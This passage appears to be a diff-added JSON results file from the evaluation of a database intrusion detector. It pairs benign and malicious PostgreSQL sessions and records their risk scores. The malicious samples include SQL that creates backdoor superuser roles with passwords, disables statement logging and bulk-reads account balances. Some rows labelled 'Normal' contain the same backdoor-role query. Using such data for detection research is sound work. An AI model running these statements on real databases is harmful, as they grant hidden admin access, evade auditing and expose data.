+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5666,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": -0.0079,
+          "margin_widened": -0.0079,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "DB_Privilege",
+          "benign": {
+            "session_id": "117962",
+            "filename": "enriched_session_117962_Normal.graphml",
+            "query": "CREATE ROLE stealth_hacker SUPERUSER LOGIN PASSWORD 'backdoor';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5497,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "112025",
+            "filename": "enriched_session_112025_OS_Privilege_Escalation.graphml",
+            "query": "CREATE ROLE hacker WITH SUPERUSER LOGIN PASSWORD 'hacked';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5695,
+            "os_status": "benign",
+            "cross_risk": 0.5495,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0198,
+          "cross_margin": 0.5495,
+          "margin_widened": 0.5297,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "DB_Privilege",
+          "benign": {
+            "session_id": "118579",
+            "filename": "enriched_session_118579_Normal.graphml",
+            "query": "CREATE TABLE IF NOT EXISTS temp_load (id INT, role TEXT, note TEXT);",
+            "tables": [],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5746,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "102191",
+            "filename": "enriched_session_102191_Data_Exfiltration.graphml",
+            "query": "CREATE TABLE IF NOT EXISTS temp_load (id INT, role TEXT, note TEXT);",
+            "tables": [],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5647,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": -0.0099,
+          "margin_widened": -0.0099,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "DB_Privilege",
+          "benign": {
+            "session_id": "118974",
+            "filename": "enriched_session_118974_Normal.graphml",
+            "query": "CREATE ROLE stealth_hacker SUPERUSER LOGIN PASSWORD 'backdoor';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5511,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "112027",
+            "filename": "enriched_session_112027_OS_Privilege_Escalation.graphml",
+            "query": "SELECT set_config('log_statement', 'none', false);",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5822,
+            "os_status": "benign",
+            "cross_risk": 0.7492,
+            "cross_status": "alert",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0311,
+          "cross_margin": 0.7492,
+          "margin_widened": 0.7181,
+          "os_discriminated": false,
+          "cross_discriminated": true
+        },
+        {
+          "category": "DB_Privilege",
+          "benign": {
+            "session_id": "101171",
+            "filename": "enriched_session_101171_Normal.graphml",
+            "query": "CREATE TABLE IF NOT EXISTS temp_load (id INT, role TEXT, note TEXT);",
+            "tables": [],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5574,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "103206",
+            "filename": "enriched_session_103206_Data_Exfiltration.graphml",
+            "query": "CREATE TABLE IF NOT EXISTS temp_load (id INT, role TEXT, note TEXT);",
+            "tables": [],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.6075,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.0501,
+          "margin_widened": 0.0501,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "DB_Privilege",
+          "benign": {
+            "session_id": "101577",
+            "filename": "enriched_session_101577_Normal.graphml",
+            "query": "CREATE ROLE stealth_hacker SUPERUSER LOGIN PASSWORD 'backdoor';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.6291,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "112071",
+            "filename": "enriched_session_112071_OS_Privilege_Escalation.graphml",
+            "query": "CREATE ROLE sqli_admin SUPERUSER LOGIN PASSWORD 'hacked';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5594,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0697,
+          "cross_margin": 0.549,
+          "margin_widened": 0.4793,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "DB_Privilege",
+          "benign": {
+            "session_id": "119591",
+            "filename": "enriched_session_119591_Normal.graphml",
+            "query": "CREATE TABLE IF NOT EXISTS temp_load (id INT, role TEXT, note TEXT);",
+            "tables": [],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5542,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "108397",
+            "filename": "enriched_session_108397_Data_Exfiltration.graphml",
+            "query": "CREATE TABLE IF NOT EXISTS temp_load (id INT, role TEXT, note TEXT);",
+            "tables": [],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5652,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.011,
+          "margin_widened": 0.011,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "DB_Privilege",
+          "benign": {
+            "session_id": "119987",
+            "filename": "enriched_session_119987_Normal.graphml",
+            "query": "CREATE ROLE stealth_hacker SUPERUSER LOGIN PASSWORD 'backdoor';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5576,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "113049",
+            "filename": "enriched_session_113049_Attack.graphml",
+            "query": "CREATE ROLE hacker WITH SUPERUSER LOGIN PASSWORD 'hacked';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5608,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0032,
+          "cross_margin": 0.549,
+          "margin_widened": 0.5458,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "DB_Privilege",
+          "benign": {
+            "session_id": "120610",
+            "filename": "enriched_session_120610_Normal.graphml",
+            "query": "CREATE TABLE IF NOT EXISTS temp_load (id INT, role TEXT, note TEXT);",
+            "tables": [],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5574,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "41926",
+            "filename": "enriched_session_41926_Data_Exfiltration.graphml",
+            "query": "SELECT 1 FROM pg_sleep(1);",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5479,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": -0.0095,
+          "margin_widened": -0.0095,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "DB_Privilege",
+          "benign": {
+            "session_id": "121004",
+            "filename": "enriched_session_121004_Normal.graphml",
+            "query": "CREATE ROLE stealth_hacker SUPERUSER LOGIN PASSWORD 'backdoor';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5535,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "113051",
+            "filename": "enriched_session_113051_Attack.graphml",
+            "query": "SELECT set_config('log_statement', 'none', false);",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5608,
+            "os_status": "benign",
+            "cross_risk": 0.7485,
+            "cross_status": "alert",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0073,
+          "cross_margin": 0.7485,
+          "margin_widened": 0.7412,
+          "os_discriminated": false,
+          "cross_discriminated": true
+        },
+        {
+          "category": "DB_Privilege",
+          "benign": {
+            "session_id": "121623",
+            "filename": "enriched_session_121623_Normal.graphml",
+            "query": "CREATE TABLE IF NOT EXISTS temp_load (id INT, role TEXT, note TEXT);",
+            "tables": [],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5652,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "42136",
+            "filename": "enriched_session_42136_Data_Exfiltration.graphml",
+            "query": "CREATE TABLE IF NOT EXISTS temp_load (id INT, role TEXT, note TEXT);",
+            "tables": [],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5574,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": -0.0078,
+          "margin_widened": -0.0078,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "DB_Privilege",
+          "benign": {
+            "session_id": "122015",
+            "filename": "enriched_session_122015_Normal.graphml",
+            "query": "CREATE ROLE stealth_hacker SUPERUSER LOGIN PASSWORD 'backdoor';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5594,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "113095",
+            "filename": "enriched_session_113095_Attack.graphml",
+            "query": "CREATE ROLE sqli_admin SUPERUSER LOGIN PASSWORD 'hacked';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5558,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0036,
+          "cross_margin": 0.549,
+          "margin_widened": 0.5454,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "DB_Privilege",
+          "benign": {
+            "session_id": "122626",
+            "filename": "enriched_session_122626_Normal.graphml",
+            "query": "CREATE TABLE IF NOT EXISTS temp_load (id INT, role TEXT, note TEXT);",
+            "tables": [],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.6075,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "52155",
+            "filename": "enriched_session_52155_Data_Exfiltration.graphml",
+            "query": "CREATE TABLE IF NOT EXISTS temp_load (id INT, role TEXT, note TEXT);",
+            "tables": [],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5626,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": -0.0449,
+          "margin_widened": -0.0449,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "DB_Privilege",
+          "benign": {
+            "session_id": "123033",
+            "filename": "enriched_session_123033_Normal.graphml",
+            "query": "CREATE ROLE stealth_hacker SUPERUSER LOGIN PASSWORD 'backdoor';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5918,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "114060",
+            "filename": "enriched_session_114060_OS_Privilege_Escalation.graphml",
+            "query": "CREATE ROLE hacker WITH SUPERUSER LOGIN PASSWORD 'hacked';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5497,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0421,
+          "cross_margin": 0.549,
+          "margin_widened": 0.5069,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "DB_Privilege",
+          "benign": {
+            "session_id": "123650",
+            "filename": "enriched_session_123650_Normal.graphml",
+            "query": "CREATE TABLE IF NOT EXISTS temp_load (id INT, role TEXT, note TEXT);",
+            "tables": [],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5478,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "53177",
+            "filename": "enriched_session_53177_Data_Exfiltration.graphml",
+            "query": "CREATE TABLE IF NOT EXISTS temp_load (id INT, role TEXT, note TEXT);",
+            "tables": [],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5746,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.0268,
+          "margin_widened": 0.0268,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "DB_Privilege",
+          "benign": {
+            "session_id": "124054",
+            "filename": "enriched_session_124054_Normal.graphml",
+            "query": "CREATE ROLE stealth_hacker SUPERUSER LOGIN PASSWORD 'backdoor';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5594,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "114062",
+            "filename": "enriched_session_114062_OS_Privilege_Escalation.graphml",
+            "query": "SELECT set_config('log_statement', 'none', false);",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5594,
+            "os_status": "benign",
+            "cross_risk": 0.7484,
+            "cross_status": "alert",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.7484,
+          "margin_widened": 0.7484,
+          "os_discriminated": false,
+          "cross_discriminated": true
+        }
+      ]
+    },
+    "Sensitive_Access": {
+      "pair_count": 30,
+      "avg_os_cosine_similarity": 1.0,
+      "avg_file_jaccard_similarity": 1.0,
+      "avg_os_margin": 0.0,
+      "avg_cross_layer_margin": 0.5344,
+      "os_discrimination_accuracy": 0.0,
+      "cross_layer_discrimination_accuracy": 0.0,
+      "all_evaluations": [
+        {
+          "category": "Sensitive_Access",
+          "benign": {
+            "session_id": "100068",
+            "filename": "enriched_session_100068_Normal.graphml",
+            "query": "select count(*) from pgbench_branches",
+            "tables": [
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5455,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "109455",
+            "filename": "enriched_session_109455_Data_Exfiltration.graphml",
+            "query": "SELECT aid, abalance FROM pgbench_accounts ORDER BY abalance DESC LIMIT 1000;",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5596,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.0141,
+          "margin_widened": 0.0141,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Sensitive_Access",
+          "benign": {
+            "session_id": "100073",
+            "filename": "enriched_session_100073_Normal.graphml",
+            "query": "BEGIN;",
+            "tables": [
+              "('Table', 'pgbench_tellers')",
+              "('Table', 'pgbench_accounts')",
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "109457",
+            "filename": "enriched_session_109457_Data_Exfiltration.graphml",
+            "query": "SELECT aid, abalance FROM pgbench_accounts ORDER BY abalance DESC LIMIT 1000;",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5482,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.5482,
+          "margin_widened": 0.5482,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Sensitive_Access",
+          "benign": {
+            "session_id": "100074",
+            "filename": "enriched_session_100074_Normal.graphml",
+            "query": "BEGIN;",
+            "tables": [
+              "('Table', 'pgbench_tellers')",
+              "('Table', 'pgbench_accounts')",
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "109458",
+            "filename": "enriched_session_109458_Data_Exfiltration.graphml",
+            "query": "SELECT aid, abalance FROM pgbench_accounts ORDER BY abalance DESC LIMIT 1000;",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5494,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.5494,
+          "margin_widened": 0.5494,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Sensitive_Access",
+          "benign": {
+            "session_id": "100075",
+            "filename": "enriched_session_100075_Normal.graphml",
+            "query": "BEGIN;",
+            "tables": [
+              "('Table', 'pgbench_tellers')",
+              "('Table', 'pgbench_accounts')",
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "109474",
+            "filename": "enriched_session_109474_Unauthorized_DB_Read.graphml",
+            "query": "SELECT aid, abalance FROM pgbench_accounts ORDER BY abalance DESC LIMIT 5000;",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5545,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.5545,
+          "margin_widened": 0.5545,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Sensitive_Access",
+          "benign": {
+            "session_id": "100076",
+            "filename": "enriched_session_100076_Normal.graphml",
+            "query": "BEGIN;",
+            "tables": [
+              "('Table', 'pgbench_tellers')",
+              "('Table', 'pgbench_accounts')",
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "109475",
+            "filename": "enriched_session_109475_Unauthorized_DB_Read.graphml",
+            "query": "SELECT aid, abalance FROM pgbench_accounts ORDER BY abalance DESC LIMIT 5000;",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5522,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.5522,
+          "margin_widened": 0.5522,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Sensitive_Access",
+          "benign": {
+            "session_id": "100077",
+            "filename": "enriched_session_100077_Normal.graphml",
+            "query": "BEGIN;",
+            "tables": [
+              "('Table', 'pgbench_tellers')",
+              "('Table', 'pgbench_accounts')",
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "109476",
+            "filename": "enriched_session_109476_Unauthorized_DB_Read.graphml",
+            "query": "SELECT aid, abalance FROM pgbench_accounts ORDER BY abalance DESC LIMIT 5000;",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5514,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.5514,
+          "margin_widened": 0.5514,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Sensitive_Access",
+          "benign": {
+            "session_id": "100078",
+            "filename": "enriched_session_100078_Normal.graphml",
+            "query": "BEGIN;",
+            "tables": [
+              "('Table', 'pgbench_tellers')",
+              "('Table', 'pgbench_accounts')",
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "110467",
+            "filename": "enriched_session_110467_Data_Exfiltration.graphml",
+            "query": "SELECT aid, abalance FROM pgbench_accounts ORDER BY abalance DESC LIMIT 1000;",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5492,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.5492,
+          "margin_widened": 0.5492,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Sensitive_Access",
+          "benign": {
+            "session_id": "100079",
+            "filename": "enriched_session_100079_Normal.graphml",
+            "query": "BEGIN;",
+            "tables": [
+              "('Table', 'pgbench_tellers')",
+              "('Table', 'pgbench_accounts')",
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "110468",
+            "filename": "enriched_session_110468_Data_Exfiltration.graphml",
+            "query": "SELECT aid, abalance FROM pgbench_accounts ORDER BY abalance DESC LIMIT 1000;",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5482,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.5482,
+          "margin_widened": 0.5482,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Sensitive_Access",
+          "benign": {
+            "session_id": "100080",
+            "filename": "enriched_session_100080_Normal.graphml",
+            "query": "BEGIN;",
+            "tables": [
+              "('Table', 'pgbench_tellers')",
+              "('Table', 'pgbench_accounts')",
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "110469",
+            "filename": "enriched_session_110469_Data_Exfiltration.graphml",
+            "query": "SELECT aid, abalance FROM pgbench_accounts ORDER BY abalance DESC LIMIT 1000;",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5672,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.5672,
+          "margin_widened": 0.5672,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Sensitive_Access",
+          "benign": {
+            "session_id": "100083",
+            "filename": "enriched_session_100083_Normal.graphml",
+            "query": "BEGIN;",
+            "tables": [
+              "('Table', 'pgbench_tellers')",
+              "('Table', 'pgbench_accounts')",
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
